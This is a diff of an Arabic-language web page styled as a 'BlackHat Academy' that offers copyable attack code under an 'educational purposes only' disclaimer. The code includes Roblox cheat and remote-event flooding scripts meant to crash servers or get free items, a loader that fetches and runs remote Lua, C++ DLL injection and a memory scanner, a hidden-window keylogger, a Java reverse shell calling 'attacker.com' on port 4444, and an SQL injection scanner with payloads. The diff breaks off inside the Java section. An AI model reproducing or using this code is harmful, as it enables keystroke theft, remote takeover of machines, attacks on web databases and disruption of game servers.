@@ -1,136 +1,1389 @@
 <!DOCTYPE html>
-<html dir="rtl" lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FR HUB - مركز النخبة</title>
+    <title>FR HUB | BlackHat Academy</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            background: #000; 
-            color: #fff; 
-            font-family: 'Segoe UI', Tahoma, sans-serif;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --neon-red: #ff003c;
+            --neon-green: #0aff00;
+            --neon-blue: #00f0ff;
+            --neon-purple: #bc13fe;
+            --dark-bg: #0a0a0a;
+            --darker: #050505;
+        }
+
+        body {
+            background: var(--dark-bg);
+            color: #fff;
+            font-family: 'Share Tech Mono', monospace;
             overflow-x: hidden;
         }
-        .header {
-            background: linear-gradient(135deg, #8b0000, #000);
-            padding: 30px 20px;
-            text-align: center;
-            border-bottom: 3px solid #ff0000;
-            box-shadow: 0 0 30px rgba(255,0,0,0.5);
-        }
-        .logo {
-            font-size: 3em;
-            font-weight: bold;
-            color: #ff0000;
-            text-shadow: 0 0 20px #ff0000;
-            letter-spacing: 3px;
-        }
-        .disclaimer {
-            background: #1a0000;
-            border: 2px solid #ff0000;
-            color: #ff6666;
-            padding: 20px;
-            margin: 20px;
-            border-radius: 10px;
-            font-size: 0.9em;
-            text-align: center;
-        }
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 15px;
-            padding: 20px;
-        }
-        .card {
-            background: linear-gradient(145deg, #1a1a1a, #0d0d0d);
-            border: 1px solid #333;
-            padding: 25px;
-            border-radius: 15px;
-            text-align: center;
-            transition: all 0.3s;
-            cursor: pointer;
-        }
-        .card:hover {
-            border-color: #ff0000;
-            transform: translateY(-5px);
-            box-shadow: 0 10px 30px rgba(255,0,0,0.3);
-        }
-        .card-icon { font-size: 2.5em; margin-bottom: 10px; }
-        .card h3 { color: #ff0000; margin-bottom: 10px; font-size: 1.2em; }
-        .card p { color: #888; font-size: 0.9em; }
-        .footer {
-            text-align: center;
-            padding: 20px;
-            color: #ff0000;
-            font-size: 0.8em;
-            border-top: 1px solid #333;
-            margin-top: 20px;
-        }
-        .ai-float {
+
+        /* Matrix Background Effect */
+        .matrix-bg {
             position: fixed;
-            bottom: 30px;
-            left: 30px;
-            width: 70px;
-            height: 70px;
-            background: #ff0000;
-            border-radius: 50%;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.1;
+            background: 
+                linear-gradient(rgba(0, 240, 255, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 240, 255, 0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
+        }
+
+        /* Header */
+        .header {
+            background: linear-gradient(135deg, var(--darker) 0%, #1a1a1a 100%);
+            border-bottom: 3px solid var(--neon-red);
+            padding: 20px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,0,60,0.2), transparent);
+            animation: scan 3s infinite;
+        }
+
+        @keyframes scan {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+
+        .logo {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 3em;
+            font-weight: 900;
+            background: linear-gradient(45deg, var(--neon-red), var(--neon-purple));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 30px rgba(255,0,60,0.5);
+            letter-spacing: 5px;
+        }
+
+        .subtitle {
+            color: var(--neon-green);
+            font-size: 1.2em;
+            margin-top: 10px;
+            text-shadow: 0 0 10px var(--neon-green);
+        }
+
+        /* Warning Banner */
+        .warning-banner {
+            background: repeating-linear-gradient(
+                45deg,
+                #ff0000,
+                #ff0000 10px,
+                #8b0000 10px,
+                #8b0000 20px
+            );
+            color: #fff;
+            text-align: center;
+            padding: 15px;
+            font-weight: bold;
+            border: 2px solid #fff;
+            animation: pulse 1s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.8; }
+        }
+
+        /* Navigation */
+        .nav {
+            background: var(--darker);
+            padding: 15px;
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+            border-bottom: 1px solid var(--neon-red);
+        }
+
+        .nav-btn {
+            background: transparent;
+            border: 2px solid var(--neon-red);
+            color: var(--neon-red);
+            padding: 10px 25px;
+            cursor: pointer;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 700;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .nav-btn:hover, .nav-btn.active {
+            background: var(--neon-red);
+            color: #000;
+            box-shadow: 0 0 20px var(--neon-red);
+        }
+
+        /* Main Container */
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 30px;
+        }
+
+        /* Sections */
+        .section {
+            display: none;
+            animation: fadeIn 0.5s;
+        }
+
+        .section.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Cards */
+        .card {
+            background: linear-gradient(135deg, #111 0%, #1a1a1a 100%);
+            border: 1px solid var(--neon-red);
+            border-radius: 10px;
+            padding: 25px;
+            margin-bottom: 25px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .card::before {
+            content: 'FR HUB';
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            font-size: 0.8em;
+            color: rgba(255,0,60,0.3);
+            font-weight: bold;
+        }
+
+        .card-title {
+            color: var(--neon-blue);
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.5em;
+            margin-bottom: 15px;
+            border-bottom: 2px solid var(--neon-blue);
+            padding-bottom: 10px;
+        }
+
+        /* Code Blocks */
+        .code-block {
+            background: #000;
+            border: 1px solid var(--neon-green);
+            border-radius: 5px;
+            padding: 20px;
+            margin: 15px 0;
+            overflow-x: auto;
+            position: relative;
+        }
+
+        .code-block::before {
+            content: attr(data-lang);
+            position: absolute;
+            top: 5px;
+            right: 10px;
+            color: var(--neon-green);
+            font-size: 0.8em;
+            background: rgba(10,255,0,0.1);
+            padding: 2px 8px;
+            border-radius: 3px;
+        }
+
+        .code-block code {
+            color: var(--neon-green);
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 0.9em;
+            line-height: 1.6;
+            white-space: pre-wrap;
+        }
+
+        .copy-btn {
+            position: absolute;
+            top: 5px;
+            left: 10px;
+            background: var(--neon-red);
+            border: none;
+            color: #fff;
+            padding: 5px 15px;
+            cursor: pointer;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 0.8em;
+            border-radius: 3px;
+        }
+
+        .copy-btn:hover {
+            background: #ff3366;
+        }
+
+        /* AI Chat Container */
+        .ai-container {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            width: 400px;
+            height: 500px;
+            background: var(--darker);
+            border: 2px solid var(--neon-purple);
+            border-radius: 15px;
+            display: flex;
+            flex-direction: column;
+            z-index: 1000;
+            box-shadow: 0 0 50px rgba(188,19,254,0.3);
+        }
+
+        .ai-header {
+            background: linear-gradient(135deg, var(--neon-purple), #8b13fe);
+            padding: 15px;
+            border-radius: 13px 13px 0 0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .ai-title {
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 700;
             display: flex;
             align-items: center;
-            justify-content: center;
-            font-size: 2em;
-            cursor: pointer;
-            box-shadow: 0 0 30px rgba(255,0,0,0.6);
-            animation: pulse 2s infinite;
+            gap: 10px;
         }
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.1); }
+
+        .ai-status {
+            width: 10px;
+            height: 10px;
+            background: var(--neon-green);
+            border-radius: 50%;
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        .ai-close {
+            background: none;
+            border: none;
+            color: #fff;
+            font-size: 1.5em;
+            cursor: pointer;
+        }
+
+        .ai-messages {
+            flex: 1;
+            overflow-y: auto;
+            padding: 15px;
+            background: #0a0a0a;
+        }
+
+        .message {
+            margin-bottom: 15px;
+            padding: 10px;
+            border-radius: 10px;
+            max-width: 85%;
+            word-wrap: break-word;
+        }
+
+        .user-message {
+            background: var(--neon-blue);
+            color: #000;
+            margin-left: auto;
+            text-align: right;
+        }
+
+        .ai-message {
+            background: #1a1a1a;
+            border: 1px solid var(--neon-purple);
+            color: #fff;
+        }
+
+        .ai-input-container {
+            padding: 15px;
+            border-top: 1px solid var(--neon-purple);
+            display: flex;
+            gap: 10px;
+        }
+
+        .ai-input {
+            flex: 1;
+            background: #1a1a1a;
+            border: 1px solid var(--neon-purple);
+            color: #fff;
+            padding: 10px;
+            border-radius: 5px;
+            font-family: 'Share Tech Mono', monospace;
+        }
+
+        .ai-send {
+            background: var(--neon-purple);
+            border: none;
+            color: #fff;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-family: 'Orbitron', sans-serif;
+        }
+
+        .ai-send:hover {
+            background: #d436ff;
+        }
+
+        .lang-selector {
+            display: flex;
+            gap: 5px;
+            padding: 10px;
+            background: #111;
+            border-bottom: 1px solid var(--neon-purple);
+        }
+
+        .lang-btn {
+            background: transparent;
+            border: 1px solid var(--neon-purple);
+            color: var(--neon-purple);
+            padding: 5px 10px;
+            cursor: pointer;
+            font-size: 0.8em;
+            border-radius: 3px;
+        }
+
+        .lang-btn.active {
+            background: var(--neon-purple);
+            color: #fff;
+        }
+
+        /* Warning Box */
+        .warning-box {
+            background: rgba(255,0,0,0.1);
+            border: 2px solid #ff0000;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: center;
+        }
+
+        .warning-box h3 {
+            color: #ff0000;
+            font-family: 'Orbitron', sans-serif;
+            margin-bottom: 10px;
+        }
+
+        /* Grid Layout */
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+        }
+
+        /* Terminal Effect */
+        .terminal {
+            background: #000;
+            border: 2px solid var(--neon-green);
+            border-radius: 10px;
+            padding: 20px;
+            font-family: 'Share Tech Mono', monospace;
+            position: relative;
+        }
+
+        .terminal-header {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #333;
+        }
+
+        .terminal-btn {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+
+        .terminal-btn.red { background: #ff5f56; }
+        .terminal-btn.yellow { background: #ffbd2e; }
+        .terminal-btn.green { background: #27c93f; }
+
+        .terminal-content {
+            color: var(--neon-green);
+            line-height: 1.8;
+        }
+
+        .terminal-line {
+            margin: 5px 0;
+        }
+
+        .terminal-line::before {
+            content: 'root@frhub:~# ';
+            color: var(--neon-red);
+        }
+
+        /* Footer */
+        .footer {
+            background: var(--darker);
+            border-top: 3px solid var(--neon-red);
+            padding: 30px;
+            text-align: center;
+            margin-top: 50px;
+        }
+
+        .footer-logo {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 2em;
+            color: var(--neon-red);
+            margin-bottom: 15px;
+        }
+
+        .copyright {
+            color: #666;
+            font-size: 0.9em;
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 10px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--darker);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--neon-red);
+            border-radius: 5px;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .logo { font-size: 2em; }
+            .ai-container {
+                width: 90%;
+                left: 5%;
+                height: 400px;
+            }
+            .nav {
+                flex-direction: column;
+                align-items: center;
+            }
+        }
+
+        /* Glitch Effect */
+        .glitch {
+            position: relative;
+            animation: glitch 2s infinite;
+        }
+
+        @keyframes glitch {
+            0%, 100% { transform: translate(0); }
+            20% { transform: translate(-2px, 2px); }
+            40% { transform: translate(-2px, -2px); }
+            60% { transform: translate(2px, 2px); }
+            80% { transform: translate(2px, -2px); }
+        }
+
+        /* Hidden watermark */
+        .watermark {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            color: rgba(255,0,60,0.2);
+            font-size: 0.8em;
+            pointer-events: none;
+            z-index: 9999;
         }
     </style>
 </head>
 <body>
-    <div class="header">
-        <div class="logo">⚡ FR HUB ⚡</div>
-        <p style="color: #ff6666; margin-top: 10px;">مركز تدريب النخبة للاختراق والتطوير</p>
+    <div class="matrix-bg"></div>
+    <div class="watermark">FR HUB © 2026 | LORD ZAYRO</div>
+
+    <!-- Warning Banner -->
+    <div class="warning-banner">
+        ⚠️ WARNING: EDUCATIONAL PURPOSES ONLY | FR HUB IS NOT RESPONSIBLE FOR ANY MISUSE | USE AT YOUR OWN RISK ⚠️
     </div>
 
-    <div class="disclaimer">
-        ⚠️ إخلاء مسؤولية: جميع المحتويات للأغراض التعليمية فقط. 
-        FR HUB غير مسؤولة عن أي استخدام غير قانوني.
+    <!-- Header -->
+    <header class="header">
+        <div class="logo glitch">FR HUB</div>
+        <div class="subtitle">BLACKHAT ACADEMY | ADVANCED EXPLOITATION</div>
+    </header>
+
+    <!-- Navigation -->
+    <nav class="nav">
+        <button class="nav-btn active" onclick="showSection('home')">الرئيسية</button>
+        <button class="nav-btn" onclick="showSection('roblox')">ROBLOX LUA</button>
+        <button class="nav-btn" onclick="showSection('cpp')">C++</button>
+        <button class="nav-btn" onclick="showSection('java')">JAVA</button>
+        <button class="nav-btn" onclick="showSection('html')">HTML</button>
+        <button class="nav-btn" onclick="showSection('tools')">الأدوات</button>
+    </nav>
+
+    <div class="container">
+        <!-- Home Section -->
+        <section id="home" class="section active">
+            <div class="warning-box">
+                <h3>⚠️ تحذير قانوني</h3>
+                <p>جميع المحتويات التعليمية هنا مخصصة للأغراض التعليمية فقط. FR HUB غير مسؤول عن أي استخدام خاطئ أو غير قانوني للمعلومات المقدمة. المستخدم مسؤول مسؤولية كاملة عن أفعاله.</p>
+            </div>
+
+            <div class="card">
+                <div class="card-title">مرحباً بك في FR HUB</div>
+                <p>منصة تعليمية متقدمة في مجال الأمن السيبراني والاختراق الأخلاقي. نقدم محتوى احترافي في:</p>
+                <ul style="margin: 20px 0; padding-right: 20px; line-height: 2;">
+                    <li>برمجة Lua لـ Roblox (Delta Executor)</li>
+                    <li>تطوير أدوات C++ للاختراق</li>
+                    <li>برمجة Java للأنظمة الموزعة</li>
+                    <li>تطوير واجهات HTML للأدوات</li>
+                    <li>استغلال الثغرات واختبار الاختراق</li>
+                </ul>
+            </div>
+
+            <div class="terminal">
+                <div class="terminal-header">
+                    <div class="terminal-btn red"></div>
+                    <div class="terminal-btn yellow"></div>
+                    <div class="terminal-btn green"></div>
+                </div>
+                <div class="terminal-content">
+                    <div class="terminal-line"> initializing FR HUB v9.0...</div>
+                    <div class="terminal-line"> loading modules... [OK]</div>
+                    <div class="terminal-line"> connecting to secure servers... [OK]</div>
+                    <div class="terminal-line"> AI assistant loaded... [OK]</div>
+                    <div class="terminal-line"> welcome to the dark side, lord zayro</div>
+                    <div class="terminal-line"> system ready for exploitation</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Roblox Lua Section -->
+        <section id="roblox" class="section">
+            <div class="warning-box">
+                <h3>⚠️ تحذير</h3>
+                <p>استخدام هذه الأساليب قد يؤدي إلى حظر حسابك في Roblox. FR HUB غير مسؤول عن أي عقوبات.</p>
+            </div>
+
+            <div class="card">
+                <div class="card-title">Delta Executor - دليل الاستخدام</div>
+                <p>Delta Executor هو أداة قوية للهواتف تدعم iOS و Android. يتيح لك تشغيل سكربتات Lua في ألعاب Roblox.</p>
+                
+                <h3 style="color: var(--neon-blue); margin: 20px 0 10px;">خطوات التثبيت:</h3>
+                <ol style="padding-right: 20px; line-height: 2;">
+                    <li>تحميل Delta Executor من الموقع الرسمي</li>
+                    <li>اختيار النسخة المناسبة (32-bit أو 64-bit)</li>
+                    <li>تثبيت التطبيق على الجهاز</li>
+                    <li>الحصول على المفتاح (Key) عبر الـ Linkvertise</li>
+                    <li>تشغيل اللعبة وحقن السكربت</li>
+                </ol>
+            </div>
+
+            <div class="card">
+                <div class="card-title">DEX Explorer - استكشاف اللعبة</div>
+                <p>DEX Explorer يسمح لك برؤية هيكل اللعبة والتعديل عليه في الوقت الفعلي.</p>
+                
+                <div class="code-block" data-lang="LUA">
+                    <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+                    <code>-- DEX Explorer Script
+-- يتيح لك استكشاف جميع عناصر اللعبة
+
+local Dex = loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
+
+-- تشغيل DEX
+Dex()
+
+-- يمكنك الآن:
+-- 1. رؤية جميع الأجزاء (Parts) في اللعبة
+-- 2. تعديل الخصائص (Properties) مباشرة
+-- 3. حذف أو إضافة عناصر
+-- 4. رؤية السكربتات المحلية</code>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-title">استغلال Remote Events</div>
+                <p>Remote Events هي نقاط الاتصال بين العميل والخادم. يمكن استغلالها للحصول على مميزات غير مشروعة.</p>
+                
+                <div class="code-block" data-lang="LUA">
+                    <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+                    <code>-- Remote Event Spammer
+-- لإرسال طلبات متكررة للخادم
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Remote = ReplicatedStorage:WaitForChild("RemoteEventName")
+
+-- إرسال طلبات متكررة
+while true do
+    Remote:FireServer("Argument1", "Argument2", 999999)
+    task.wait(0.1) -- تأخير 0.1 ثانية
+end
+
+-- أو يمكنك استخدام:
+for i = 1, 1000 do
+    Remote:FireServer(true, i)
+end</code>
+                </div>
+
+                <div class="code-block" data-lang="LUA">
+                    <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+                    <code>-- Remote Spy - التجسس على الأحداث
+-- لرؤية جميع Remote Events التي يتم استدعاؤها
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+-- تخزين الأحداث
+local Remotes = {}
+
+-- فحص جميع الأطفال
+for _, v in pairs(ReplicatedStorage:GetDescendants()) do
+    if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
+        table.insert(Remotes, v)
+        print("Found Remote:", v.Name)
+    end
+end
+
+-- التجسس على FireServer الأصلي
+local oldFireServer
+oldFireServer = hookfunction(Instance.new("RemoteEvent").FireServer, function(self, ...)
+    print("Fired:", self.Name, "Args:", {...})
+    return oldFireServer(self, ...)
+end)</code>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-title">حرق Remote Events</div>
+                <p>تقنية "الحرق" تعني إرسال كمية هائلة من الطلبات لتعطيل الخادم أو الحصول على موارد غير محدودة.</p>
+                
+                <div class="code-block" data-lang="LUA">
+                    <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+                    <code>-- Remote Burner - حرق الريموت
+-- إرسال آلاف الطلبات في الثانية
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local targetRemote = ReplicatedStorage:FindFirstChild("BuyItem") -- غيّر الاسم حسب اللعبة
+
+local function burnRemote()
+    while true do
+        for i = 1, 100 do
+            task.spawn(function()
+                targetRemote:FireServer({
+                    Item = "RareSword",
+                    Amount = 999999,
+                    Price = 0
+                })
+            end)
+        end
+        task.wait()
+    end
+end
+
+-- تشغيل في عدة مهام متوازية
+for i = 1, 5 do
+    task.spawn(burnRemote)
+end</code>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-title">Fly Script - الطيران</div>
+                <div class="code-block" data-lang="LUA">
+                    <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+                    <code>-- Fly Script for Delta Executor
+-- سكربت الطيران الشهير
+
+local Player = game.Players.LocalPlayer
+local Character = Player.Character or Player.CharacterAdded:Wait()
+local Humanoid = Character:WaitForChild("Humanoid")
+local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
+
+local flying = false
+local speed = 50
+
+local function fly()
+    flying = not flying
+    if flying then
+        local bg = Instance.new("BodyGyro", HumanoidRootPart)
+        bg.P = 9e4
+        bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
+        bg.cframe = HumanoidRootPart.CFrame
+        
+        local bv = Instance.new("BodyVelocity", HumanoidRootPart)
+        bv.velocity = Vector3.new(0,0.1,0)
+        bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
+        
+        repeat wait()
+            Humanoid.PlatformStand = true
+            bv.velocity = workspace.CurrentCamera.CFrame.LookVector * speed
+        until not flying
+        
+        bg:Destroy()
+        bv:Destroy()
+        Humanoid.PlatformStand = false
+    end
+end
+
+-- ربط بزر
+game:GetService("UserInputService").InputBegan:Connect(function(input)
+    if input.KeyCode == Enum.KeyCode.F then
+        fly()
+    end
+end)</code>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-title">ESP & Aimbot - رؤية الأعداء</div>
+                <div class="code-block" data-lang="LUA">
+                    <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+                    <code>-- ESP (Extra Sensory Perception)
+-- رؤية اللاعبين من خلال الجدران
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local Camera = workspace.CurrentCamera
+
+local function createESP(player)
+    if player == LocalPlayer then return end
+    
+    local esp = Drawing.new("Text")
+    esp.Visible = false
+    esp.Center = true
+    esp.Outline = true
+    esp.Font = 2
+    esp.Size = 13
+    esp.Color = Color3.fromRGB(255, 0, 0)
+    
+    game:GetService("RunService").RenderStepped:Connect(function()
+        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+            local pos, onScreen = Camera:WorldToViewportPoint(player.Character.HumanoidRootPart.Position)
+            if onScreen then
+                esp.Position = Vector2.new(pos.X, pos.Y)
+                esp.Text = player.Name .. " [" .. math.floor((LocalPlayer.Character.HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position).Magnitude) .. "m]"
+                esp.Visible = true
+            else
+                esp.Visible = false
+            end
+        else
+            esp.Visible = false
+        end
+    end)
+end
+
+-- تطبيق ESP على جميع اللاعبين
+for _, player in pairs(Players:GetPlayers()) do
+    createESP(player)
+end
+
+Players.PlayerAdded:Connect(createESP)</code>
+                </div>
+            </div>
+        </section>
+
+        <!-- C++ Section -->
+        <section id="cpp" class="section">
+            <div class="card">
+                <div class="card-title">C++ للاختراق المتقدم</div>
+                <p>C++ هي اللغة الأم لتطوير أدوات الاختراق عالية الأداء والـ Exploits.</p>
+                
+                <div class="code-block" data-lang="C++">
+                    <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+                    <code>// Process Injection - حقن العمليات
+// حقن DLL في عملية مستهدفة
+
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+
+bool InjectDLL(DWORD procId, const char* dllPath) {
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procId);
+    if (!hProcess) return false;
+    
+    LPVOID allocMem = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, 
+        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+    
+    WriteProcessMemory(hProcess, allocMem, dllPath, strlen(dllPath) + 1, NULL);
+    
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("kernel32.dll"), 
+        "LoadLibraryA"), allocMem, 0, NULL);
+    
+    if (hThread) {
+        WaitForSingleObject(hThread, INFINITE);
+        CloseHandle(hThread);
+    }
+    
+    VirtualFreeEx(hProcess, allocMem, 0, MEM_RELEASE);
+    CloseHandle(hProcess);
+    return true;
+}
+
+int main() {
+    DWORD pid = 1234; // معرف العملية
+    const char* dll = "C:\\path\\to\\hack.dll";
+    
+    if (InjectDLL(pid, dll)) {
+        std::cout << "Injection Successful!" << std::endl;
+    }
+    return 0;
+}</code>
+                </div>
+
+                <div class="code-block" data-lang="C++">
+                    <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+                    <code>// Memory Scanner - ماسح الذاكرة
+// البحث عن القيم في ذاكرة اللعبة
+
+#include &lt;windows.h&gt;
+#include &lt;vector&gt;
+#include &lt;iostream&gt;
+
+class MemoryScanner {
+private:
+    HANDLE hProcess;
+    
+public:
+    MemoryScanner(DWORD pid) {
+        hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, 
+            FALSE, pid);
+    }
+    
+    template&lt;typename T&gt;
+    std::vector&lt;LPVOID&gt; Scan(T value) {
+        std::vector&lt;LPVOID&gt; results;
+        MEMORY_BASIC_INFORMATION mbi;
+        LPVOID addr = 0;
+        
+        while (VirtualQueryEx(hProcess, addr, &mbi, sizeof(mbi))) {
+            if (mbi.State == MEM_COMMIT && (mbi.Protect & PAGE_READWRITE)) {
+                std::vector&lt;char&gt; buffer(mbi.RegionSize);
+                SIZE_T bytesRead;
+                
+                if (ReadProcessMemory(hProcess, mbi.BaseAddress, buffer.data(), 
+                    mbi.RegionSize, &bytesRead)) {
+                    
+                    for (size_t i = 0; i < bytesRead - sizeof(T); i++) {
+                        if (*(T*)&buffer[i] == value) {
+                            results.push_back((LPVOID)((DWORD_PTR)mbi.BaseAddress + i));
+                        }
+                    }
+                }
+            }
+            addr = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
+        }
+        return results;
+    }
+    
+    template&lt;typename T&gt;
+    bool Write(LPVOID address, T value) {
+        return WriteProcessMemory(hProcess, address, &value, sizeof(T), NULL);
+    }
+};</code>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-title">Keylogger بسيط</div>
+                <div class="code-block" data-lang="C++">
+                    <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+                    <code>// Keylogger - مسجل لوحة المفاتيح
+// تسجيل ضغطات المفاتيح
+
+#include &lt;windows.h&gt;
+#include &lt;fstream&gt;
+#include &lt;iostream&gt;
+
+void LogKey(int key, const char* file) {
+    std::ofstream log(file, std::ios::app);
+    
+    if (key == VK_SPACE) log << " ";
+    else if (key == VK_RETURN) log << "\n";
+    else if (key == VK_SHIFT) log << " [SHIFT] ";
+    else if (key >= 48 && key <= 90) {
+        bool shift = GetAsyncKeyState(VK_SHIFT);
+        char c = MapVirtualKey(key, MAPVK_VK_TO_CHAR);
+        log << (shift ? toupper(c) : tolower(c));
+    }
+    log.close();
+}
+
+int main() {
+    const char* filename = "log.txt";
+    ShowWindow(GetConsoleWindow(), SW_HIDE); // إخفاء النافذة
+    
+    while (true) {
+        for (int i = 8; i <= 190; i++) {
+            if (GetAsyncKeyState(i) == -32767) {
+                LogKey(i, filename);
+            }
+        }
+        Sleep(10);
+    }
+    return 0;
+}</code>
+                </div>
+            </div>
+        </section>
+
+        <!-- Java Section -->
+        <section id="java" class="section">
+            <div class="card">
+                <div class="card-title">Java للاختراق</div>
+                <p>Java تستخدم في تطوير أدوات الاختراق عبر المنصات وبرمجة الـ Android.</p>
+                
+                <div class="code-block" data-lang="JAVA">
+                    <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+                    <code>// Reverse Shell - قشرة عكسية
+// اتصال عكسي بالمهاجم
+
+import java.io.*;
+import java.net.*;
+
+public class ReverseShell {
+    public static void main(String[] args) {
+        String host = "attacker.com"; // IP المهاجم
+        int port = 4444;
+        
+        try {
+            Socket socket = new Socket(host, port);
+            Process process = Runtime.getRuntime().exec("/bin/sh");
+            
+            InputStream pi = process.getInputStream();
+            InputStream pe = process.getErrorStream();
+            OutputStream po = process.getOutputStream();
+            
+            InputStream si = socket.getInputStream();
+            OutputStream so = socket.getOutputStream();
+            
+            while (!socket.isClosed()) {
+                while (pi.available() > 0) so.write(pi.read());
+                while (pe.available() > 0) so.write(pe.read());
+                while (si.available() > 0) po.write(si.read());
+                
+                so.flush();
+                po.flush();
+                Thread.sleep(50);
+            }
+            
+            process.destroy();
+            socket.close();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}</code>
+                </div>
+
+                <div class="code-block" data-lang="JAVA">
+                    <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+                    <code>// SQL Injection Scanner - ماسح حقن SQL
+// البحث عن ثغرات SQL Injection
+
+import java.net.*;
+import java.io.*;
+
+public class SQLiScanner {
+    private static final String[] PAYLOADS = {
+        "' OR '1'='1",
+        "' OR 1=1--",
+        "1' AND 1=1--",
+        "' UNION SELECT NULL--"
+    };
+    
+    public static boolean testInjection(String url) {
+        try {
+            for (String payload : PAYLOADS) {
+                String testUrl = url + payload;
+                HttpURLConnection conn = (HttpURLConnection) 
+                    new URL(testUrl).openConnection();
+                conn.setRequestMethod("GET");
+                
+                BufferedReader reader = new BufferedReader(
+                    new InputStreamReader(conn.getInputStream()));
+                String line;
+                StringBuilder response = new StringBuilder();
+                
+                while ((line = reader.readLine()) != null) {
+                    response.append(line);
+                }
+                reader.close();
+                
+                // التحقق من علامات الخطأ
+                String resp = response.toString().toLowerCase();
+                if (resp.contains("sql") || resp.contains("syntax") || 
+                    resp.contains("mysql") || resp.contains("error")) {
+                    System.out.println("[!] Vulnerable: " + testUrl);
+                    return true;
+                }
+            }
+        } catch (Exception e) {
+            System.out.println("[-] Error: " + e.getMessage());
+        }
+        return false;
+    }
+    
+    public static void main(String[] args) {
+        testInjection("http://target.com/page.php?id=");
+    }
+}</code>
